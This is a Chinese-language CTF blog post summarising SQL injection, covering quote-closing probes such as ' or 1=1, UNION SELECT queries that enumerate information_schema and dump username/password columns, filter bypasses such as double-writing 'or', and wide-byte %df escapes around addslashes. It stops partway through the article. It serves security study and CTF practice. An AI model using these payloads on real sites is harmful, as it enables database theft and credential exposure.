<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.3.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">
  <meta name="google-site-verification" content="YGm-O0FYtJIJd878GKblZACh8xSr46g0l4F5UDGhoTc">
  <meta name="baidu-site-verification" content="code-tyOuGzoN3z">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.1/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.css">
  <script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.js"></script>

<script class="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"yanmymickey.github.io","root":"/","images":"/images","scheme":"Gemini","version":"8.2.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}};
  </script>
<meta name="description" content="sql注入总结0x00前言 SQL注入最主要的是判断注入目标的SQL语句和字符处理过程,根据判断结果选择合适的注入方法和技巧进行脱库">
<meta property="og:type" content="article">
<meta property="og:title" content="sql注入总结">
<meta property="og:url" content="https://yanmymickey.github.io/2020/02/11/CTF/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/index.html">
<meta property="og:site_name" content="菜鸡的BLOG">
<meta property="og:description" content="sql注入总结0x00前言 SQL注入最主要的是判断注入目标的SQL语句和字符处理过程,根据判断结果选择合适的注入方法和技巧进行脱库">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2020-02-10T16:00:00.000Z">
<meta property="article:modified_time" content="2021-01-16T02:10:19.046Z">
<meta property="article:author" content="D15h35">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="sql">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://yanmymickey.github.io/2020/02/11/CTF/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">


<script class="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>
<title>sql注入总结 | 菜鸡的BLOG</title>
  
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-XZVDBPC6X7"></script>
    <script>
      if (CONFIG.hostname === location.hostname) {
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'G-XZVDBPC6X7');
      }
    </script>

  <script>
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?633ffcf7a0f511eb45dead6c18798c6f";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>



  <noscript>
  <style>
  body { margin-top: 2rem; }

  .use-motion .menu-item,
  .use-motion .sidebar,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header {
    visibility: visible;
  }

  .use-motion .header,
  .use-motion .site-brand-container .toggle,
  .use-motion .footer { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle,
  .use-motion .custom-logo-image {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line {
    transform: scaleX(1);
  }

  .search-pop-overlay, .sidebar-nav { display: none; }
  .sidebar-panel { display: block; }
  </style>
</noscript>

<link rel="alternate" href="/atom.xml" title="菜鸡的BLOG" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">菜鸡的BLOG</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li>
        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">31</span></a></li>
        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">16</span></a></li>
        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">58</span></a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93"><span class="nav-number">1.</span> <span class="nav-text">sql注入总结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00%E5%89%8D%E8%A8%80"><span class="nav-number">1.1.</span> <span class="nav-text">0x00前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5"><span class="nav-number">1.2.</span> <span class="nav-text">0x01常用语句</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%A8%E4%BA%8E%E5%B0%9D%E8%AF%95"><span class="nav-number">1.2.1.</span> <span class="nav-text">用于尝试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%A8%E4%BA%8E%E6%9F%A5%E8%AF%A2"><span class="nav-number">1.2.2.</span> <span class="nav-text">用于查询</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="nav-number">1.3.</span> <span class="nav-text">0x02注入类型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8C%89%E5%8F%98%E9%87%8F%E7%B1%BB%E5%9E%8B"><span class="nav-number">1.3.1.</span> <span class="nav-text">按变量类型</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B"><span class="nav-number">1.3.1.1.</span> <span class="nav-text">数字型</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B"><span class="nav-number">1.3.1.2.</span> <span class="nav-text">字符型</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8C%89HTTP%E6%8F%90%E4%BA%A4%E6%96%B9%E5%BC%8F"><span class="nav-number">1.3.2.</span> <span class="nav-text">按HTTP提交方式</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#GET"><span class="nav-number">1.3.2.1.</span> <span class="nav-text">GET</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#POST"><span class="nav-number">1.3.2.2.</span> <span class="nav-text">POST</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%90%8E%E7%AB%AF%E6%97%A0%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E5%9E%8B"><span class="nav-number">1.3.2.2.1.</span> <span class="nav-text">后端无数据处理型</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%90%8E%E7%AB%AF%E6%9C%89%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E5%9E%8B"><span class="nav-number">1.3.2.2.2.</span> <span class="nav-text">后端有数据处理型</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86"><span class="nav-number">1.3.2.2.2.1.</span> <span class="nav-text">常见数据处理</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="nav-number">1.3.2.2.2.2.</span> <span class="nav-text">宽字节注入</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Cookies"><span class="nav-number">1.3.2.3.</span> <span class="nav-text">Cookies</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#head%E4%B8%AD"><span class="nav-number">1.3.2.3.1.</span> <span class="nav-text">head中</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8C%89%E4%BB%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8E%A5%E6%94%B6%E5%88%B0%E7%9A%84%E5%93%8D%E5%BA%94"><span class="nav-number">1.3.3.</span> <span class="nav-text">按从服务器接收到的响应</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%98%BE%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">1.3.3.1.</span> <span class="nav-text">显错注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%B2%E6%B3%A8"><span class="nav-number">1.3.3.2.</span> <span class="nav-text">盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8Ebool"><span class="nav-number">1.3.3.2.1.</span> <span class="nav-text">基于bool</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99"><span class="nav-number">1.3.3.2.2.</span> <span class="nav-text">基于报错</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E5%92%8C%E7%A4%BA%E4%BE%8B"><span class="nav-number">1.3.3.2.2.1.</span> <span class="nav-text">报错注入总结和示例</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4"><span class="nav-number">1.3.3.2.3.</span> <span class="nav-text">基于时间</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A0%86%E5%8F%A0%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="nav-number">1.3.3.3.</span> <span class="nav-text">堆叠查询注入</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8C%89%E6%B3%A8%E5%85%A5%E7%9A%84%E7%A8%8B%E5%BA%A6%E5%92%8C%E9%A1%BA%E5%BA%8F"><span class="nav-number">1.4.</span> <span class="nav-text">按注入的程度和顺序</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E9%98%B6%E6%B3%A8%E5%85%A5"><span class="nav-number">1.4.1.</span> <span class="nav-text">一阶注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E9%98%B6%E6%B3%A8%E5%85%A5%EF%BC%88%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="nav-number">1.4.2.</span> <span class="nav-text">二阶注入（二次注入）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%9F%BA%E6%9C%AC%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="nav-number">1.5.</span> <span class="nav-text">0x03 基本手工注入流程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81MySQL-gt-5-0"><span class="nav-number">1.5.1.</span> <span class="nav-text">1、MySQL &gt;&#x3D; 5.0</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="nav-number">1.5.1.1.</span> <span class="nav-text">（1）获取字段数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%882%EF%BC%89%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="nav-number">1.5.1.2.</span> <span class="nav-text">（2）获取系统数据库名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%883%EF%BC%89%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="nav-number">1.5.1.3.</span> <span class="nav-text">（3）获取当前数据库名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%884%EF%BC%89%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E8%A1%A8"><span class="nav-number">1.5.1.4.</span> <span class="nav-text">（4）获取数据库中的表</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%885%EF%BC%89%E8%8E%B7%E5%8F%96%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%AD%97%E6%AE%B5"><span class="nav-number">1.5.1.5.</span> <span class="nav-text">（5）获取表中的字段</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%886%EF%BC%89%E8%8E%B7%E5%8F%96%E5%90%84%E4%B8%AA%E5%AD%97%E6%AE%B5%E5%80%BC"><span class="nav-number">1.5.1.6.</span> <span class="nav-text">（6）获取各个字段值</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81MySQL-lt-5-0"><span class="nav-number">1.5.2.</span> <span class="nav-text">2、MySQL &lt; 5.0</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="nav-number">1.5.3.</span> <span class="nav-text">相关函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="nav-number">1.5.3.1.</span> <span class="nav-text">（1）基于布尔的盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%882%EF%BC%89%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="nav-number">1.5.3.2.</span> <span class="nav-text">（2）基于时间的盲注</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF"><span class="nav-number">1.6.</span> <span class="nav-text">0x04SQL注入绕过技术</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="D15h35"
      src="/images/while.png">
  <p class="site-author-name" itemprop="name">D15h35</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">58</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">16</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">31</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author site-overview-item animated">
      <span class="links-of-author-item">
        <a href="https://github.com/yanmymickey" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yanmymickey" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
  </div>



        </div>
      </div>
        <div class="back-to-top animated" role="button">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <a href="https://github.com/yanmymickey" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://yanmymickey.github.io/2020/02/11/CTF/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/while.png">
      <meta itemprop="name" content="D15h35">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="菜鸡的BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          sql注入总结
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2020-02-11 00:00:00" itemprop="dateCreated datePublished" datetime="2020-02-11T00:00:00+08:00">2020-02-11</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-01-16 10:10:19" itemprop="dateModified" datetime="2021-01-16T10:10:19+08:00">2021-01-16</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
        </span>
          , 
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CTF/sql/" itemprop="url" rel="index"><span itemprop="name">sql</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">Views: </span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h1 id="sql注入总结"><a href="#sql注入总结" class="headerlink" title="sql注入总结"></a>sql注入总结</h1><h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><hr>
<p>SQL注入最主要的是判断注入目标的SQL语句和字符处理过程,根据判断结果选择合适的注入方法和技巧进行脱库</p>
<a id="more"></a>

<p>常见SQL注入类型有:</p>
<ul>
<li>按变量类型<ul>
<li>字符型</li>
<li>数字型</li>
</ul>
</li>
<li>按HTTP提交方式<ul>
<li>GET</li>
<li>POST</li>
<li>Cookies</li>
<li>head中<ul>
<li>User-Agent</li>
<li>Referer</li>
</ul>
</li>
</ul>
</li>
<li>按从服务器接收到的响应<ul>
<li>显错注入(没有关闭错误显示,会显示mysql error)</li>
<li>盲注(只会告诉你sql语句的执行结果true or false,不会将sql语句执行结果展示给你)<ul>
<li>基于时间</li>
<li>基于bool</li>
<li>基于报错</li>
</ul>
</li>
<li>堆叠查询注入</li>
</ul>
</li>
<li>基于程度和顺序的注入<ul>
<li>一阶注入</li>
<li>二阶注入</li>
</ul>
</li>
</ul>
<h2 id="0x01常用语句"><a href="#0x01常用语句" class="headerlink" title="0x01常用语句"></a>0x01常用语句</h2><h3 id="用于尝试"><a href="#用于尝试" class="headerlink" title="用于尝试"></a>用于尝试</h3><p>Ps:–+可以用#替换，url 提交过程中 url 编码后的#为%23</p>
<ul>
<li>or 1=1–+</li>
<li>‘ or 1=1–+</li>
<li>“ or 1=1–+</li>
<li>) or 1=1–+</li>
<li>‘)or 1=1–+</li>
<li>“) or 1=1–+</li>
<li>“))or 1=1–+</li>
</ul>
<p>总的来说,思路为闭合前面本来sql语句中的符号,注释掉后面的符号</p>
<h3 id="用于查询"><a href="#用于查询" class="headerlink" title="用于查询"></a>用于查询</h3><ul>
<li>（1）获取字段数</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by n  &#x2F;*通过不断尝试改变n的值来观察页面反应确定字段数*&#x2F;</span><br></pre></td></tr></table></figure>
<ul>
<li>（2） 获取系统中所有数据库名</li>
</ul>
<p>在MySQL &gt;5.0中，数据库名存放在information_schema数据库下schemata表schema_name字段中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select null,null,group_concat(schema_name) from information_schema.schemata</span><br></pre></td></tr></table></figure>
<ul>
<li>（3）获取当前数据库名</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select null,null,...,database()</span><br></pre></td></tr></table></figure>
<ul>
<li>（4）获取数据库中的表</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select null,null,...,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select null,null,...,table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1</span><br></pre></td></tr></table></figure>
<ul>
<li>（5）获取表中的字段</li>
</ul>
<p>这里假设已经获取到表名为user</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select null,null,...,group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39;</span><br></pre></td></tr></table></figure>
<ul>
<li>（6）获取各个字段值</li>
</ul>
<p>这里假设已经获取到表名为user，且字段为username和password</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select null,group_concat(username,password) from users</span><br></pre></td></tr></table></figure>
<h2 id="0x02注入类型"><a href="#0x02注入类型" class="headerlink" title="0x02注入类型"></a>0x02注入类型</h2><h3 id="按变量类型"><a href="#按变量类型" class="headerlink" title="按变量类型"></a>按变量类型</h3><h4 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a>数字型</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 union select database()</span><br></pre></td></tr></table></figure>
<h4 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1&#39; union select database()</span><br><span class="line">id&#x3D;1&quot; union select database()</span><br><span class="line">id&#x3D;1&#39;) union select database()</span><br><span class="line">id&#x3D;1&quot;) union select database()</span><br></pre></td></tr></table></figure>
<h3 id="按HTTP提交方式"><a href="#按HTTP提交方式" class="headerlink" title="按HTTP提交方式"></a>按HTTP提交方式</h3><h4 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h4><p>参考上方按变量类型</p>
<h4 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h4><p>一般为登录框,留言板等等,以表单形式提交的字段</p>
<h5 id="后端无数据处理型"><a href="#后端无数据处理型" class="headerlink" title="后端无数据处理型"></a>后端无数据处理型</h5><p>无数据处理,既sql语句和变量直接拼接,形式参考GET,#不需要url编码</p>
<h5 id="后端有数据处理型"><a href="#后端有数据处理型" class="headerlink" title="后端有数据处理型"></a>后端有数据处理型</h5><h6 id="常见数据处理"><a href="#常见数据处理" class="headerlink" title="常见数据处理"></a>常见数据处理</h6><ul>
<li>数据处理函数</li>
</ul>
<p><strong>preg_replace()</strong></p>
<p>当代码为<code>preg_replace(&#39;/or/i&#39;,&quot;&quot;, $id)</code>时,可以利用双写过滤字符,因为替换为空,而且只检测一次</p>
<p>例如绕过上述只需将<code>or</code>写出<code>oorr</code>即可,替换掉中间的<code>or</code>之后,剩下的字段就变成了<code>or</code></p>
<p>如果匹配中没有统计大小写,还可以利用变换语句中字母的大小写进行绕过</p>
<p><strong>addslashes()</strong></p>
<ul>
<li>字符编码问题导致绕过<ul>
<li>设置数据库字符为gbk导致宽字节注入</li>
<li>使用icon,mb_convert_encoding转换字符编码函数导致宽字节注入</li>
</ul>
</li>
<li>编码解码导致的绕过<ul>
<li>url解码导致绕过addslashes</li>
<li>base64解码导致绕过addslashes</li>
<li>json编码导致绕过addslashes</li>
</ul>
</li>
<li>一些特殊情况导致的绕过<ul>
<li>没有使用引号保护字符串，直接无视addslashes</li>
<li>使用了stripslashes</li>
<li>字符替换导致的绕过addslashes</li>
</ul>
</li>
</ul>
<hr>
<h6 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h6><p>1、%df 吃掉 \ 具体的原因是 urlencode(‘) = %5c%27，我们在%5c%27 前面添加%df，形成%df%5c%27， mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字， 此时%df%5c 就是一个汉字， %27 则作为一个单独的符号在外面， 这样就达到了我们的目的。<br>2、将 \’ 中的 \ 过滤掉， 例如可以构造 %**%5c%5c%27 的情况， 后面的%5c 会被前面的%5c给注释掉。这也是 bypass 的一种方法</p>
<p>3、将utf-8的 ‘ 转换为 �’</p>
<p>�’or 1=1 limit 1,1#</p>
<p>还有很多绕过<strong>引号</strong>、<strong>双引号</strong>、<strong>逗号</strong>、<strong>空格</strong>的方法</p>
